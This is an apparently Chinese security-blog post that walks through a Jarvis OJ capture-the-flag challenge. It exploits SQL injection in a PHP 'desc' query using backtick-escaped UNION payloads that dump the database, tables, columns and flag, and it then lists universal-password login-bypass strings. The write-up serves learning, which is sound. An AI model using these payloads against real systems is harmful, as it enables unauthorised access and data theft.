<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>desc相关注入 | 人间且慢行</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><meta name="referrer" content="no-referrer-when-downgrade"><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">desc相关注入</h1><a id="logo" href="/.">人间且慢行</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">desc相关注入</h1><div class="post-meta">Sep 14, 2019<span> | </span><span class="category"><a href="/categories/安全/">安全</a></span><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#desc相关"><span class="toc-number">1.</span> <span class="toc-text">desc相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#万能密码"><span class="toc-number">1.1.</span> <span class="toc-text">万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.1.1.</span> <span class="toc-text">#:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">+:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#N"><span class="toc-number">1.1.3.</span> <span class="toc-text">/N</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><h1 id="desc相关"><a href="#desc相关" class="headerlink" title="desc相关"></a>desc相关</h1><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/bCW4h8iaC7.png" alt="1"></p>
<p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/sMych536BP.png" alt="2"></p>
<p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/3ntMTEtGJS.png" alt="3"><br>如图3：如果指定不存在的参数<code>aaaa</code>跟进去，一样可以执行。只是返回的是Empty set。</p>
<p>例题：Jarvis OJ <a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">inject
</a></p>
<p>提示说先找到源码再说，于是试一试常见的备份文件临时文件名，比如.bak、.swp、.save、~ 等，最后在index.php~找到<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/z2Xp3sDfSz.png" alt="4"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span></span><br><span class="line"><span class="php">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span></span><br><span class="line"><span class="php">$table = Filter($table);</span></span><br><span class="line"><span class="php">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();<span class="comment">//执行失败返回jaacker（）结果</span></span></span><br><span class="line"><span class="php">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span></span><br><span class="line"><span class="php">$ret = sql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ret[<span class="number">0</span>];<span class="comment">//打印数组中第一个参数（也就是说我们从表中拿出2条数据，他只能返回第一条）</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>$_GET[‘table’]是我们能够传递的参数</p>
<p>需要想办法执行成功</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br></pre></td></tr></table></figure>

<p>然后进入<code>$sql = &quot;select &#39;flag{xxx}&#39; from secret_{$table}&quot;;</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一、反引号</span><br><span class="line">    反引号一般在Esc键的下方，和～在一起。它是为了区分MySQL的保留字与普通字符而引入的符号</span><br><span class="line">    <span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span> 报错 </span><br><span class="line">    <span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span> 成功</span><br><span class="line">    一般我们建表时都会将表名，库名都加上反引号来保证语句的执行度。</span><br><span class="line"></span><br><span class="line">二、引号</span><br><span class="line">    引号一般用于变量的应用，反引号用于字段引用</span><br><span class="line"></span><br><span class="line">三、如果<span class="keyword">SQL</span>语句中变量带有引号或者反引号时，可以用过如下输出</span><br><span class="line">    输出字符串aaa<span class="string">'：select '</span>aaa<span class="string">'''; 或者select '</span>aaa\<span class="string">''</span> ; (在最后加两个引号表明字符串中又引号)</span><br><span class="line">    输出字符串'aaa: <span class="keyword">select</span> <span class="string">'''aaa'</span>; 或者<span class="keyword">select</span> <span class="string">'\'aaa'</span> ;</span><br><span class="line">    输出字符串a'aa：<span class="keyword">select</span> <span class="string">'a\'aa'</span> ;</span><br></pre></td></tr></table></figure>

<p>select 一般我们用到的是union联合查询<code>select 1</code>实际查询语句可能是</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`desc `</span>seret_&#123;$table&#125; <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1`</span></span><br></pre></td></tr></table></figure>

<p>现在需要把反引号中的数据分隔开来<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/XxTBGhccQC.png" alt="5"><br>实验发现加引号会报错，反引号可以执行<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/Sez4iAechY.png" alt="6"><br>构造</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=test<span class="string">` `</span><span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">database</span>() <span class="title">limit</span> 1 <span class="title">offset</span> 1</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>select * from table limit 2 offset 1;<br>//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</p>
</blockquote>
<p>拿到了数据库<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/e2YZPdFCMa.png" alt="7"></p>
<p>爆表：<br><code>?table=test</code> <code>union select group_concat(table_name) from information_schema.tables where table_schema=database()  limit 1 offset 1</code><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/SaXkACMKns.png" alt="8"></p>
<p>爆列：<br><code>?table=test</code> <code>union select group_concat(column_name) from information_schema.columns where table_schema=database() limit 1 offset 1</code>(这里也可以直接写数据库名，过滤引号的话，转成16进制)<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/NbS4Jjcf3j.png" alt="9"></p>
<p>爆flag<br><code>?table=test</code> <code>union select group_concat(flagUwillNeverKnow) from secret_flag limit 1 offset 1</code></p>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/KAAWtEEcSj.png" alt="10"></p>
<h3 id><a href="#" class="headerlink" title="#:"></a>#:</h3><p><code>select * from user where username = &#39;admin&#39; and password=&#39;123&#39;</code><br>这样可以查出结果，表示登陆成功的</p>
<p><code>select * from user where username = &#39;admin&#39;;#and password=&#39;123&#39;</code>这样也是可以查到的<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/D3wcQtnNBi.png" alt="11"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title="+:"></a>+:</h3><p>可以认为mysql非数字开头的字符串会被当成0<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/jkPzbZdsiB.png" alt="12"><br>这里a=0返回ture<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/MH7TfrbDEH.png" alt="13"></p>
<p>利用：假设一些符号不能传，可以传引号的话，<code>select * from user where username = &#39;&#39;+&#39;&#39; and password=&#39;&#39;+&#39;</code></p>
<p>这样一样是可以出结果的这样的话，如果是整型的话也是可以的<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/RcEBDwxdkw.png" alt="14"></p>
<p><code>select * from user where username = &#39;bbb&#39;=&#39;&#39; and password=&#39;bbb&#39;=&#39; &#39;</code><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/BZf6ZBMtZR.png" alt="15"></p>
<h3 id="N"><a href="#N" class="headerlink" title="/N"></a>/N</h3><p><code>select 1,2,\Nfrom data1</code><br>\N后面默认跟空格</p>
<p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190913/Jx78z4kdp5.png" alt="16"></p>
</div><div class="tags"><a href="/tags/web安全-ctf/">web安全 ctf</a></div><div class="post-nav"><a class="pre" href="/2019/09/15/1.文件上传/">文件上传</a><a class="next" href="/2019/09/13/order by/">order by，insert相关注入</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/信安之路/">信安之路</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/基础知识/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书/">读书</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/转载/">转载</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/web安全-ctf/" style="font-size: 15px;">web安全 ctf</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/计算机网络/" style="font-size: 15px;">计算机网络</a> <a href="/tags/博客搭建/" style="font-size: 15px;">博客搭建</a> <a href="/tags/安全/" style="font-size: 15px;">安全</a> <a href="/tags/基础/" style="font-size: 15px;">基础</a> <a href="/tags/数据结构/" style="font-size: 15px;">数据结构</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/04/3.代码执行与命令执行/">代码执行与命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/20/2.文件包含/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/1.文件上传/">文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/14/desc相关例题/">desc相关注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/13/order by/">order by，insert相关注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/12/bool型盲注/">bool型盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/基于时间盲注的部分相关函数/">基于时间盲注的部分相关函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/约束条件的安全测试——报错注入/">约束条件的安全测试_报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/05/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/03/集合和映射/">集合和映射</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">人间且慢行.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="0,0,0" opacity="0.5" zindex="-2" count="50" src="//lib.baomitu.com/canvas-nest.js/2.0.4/canvas-nest.umd.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>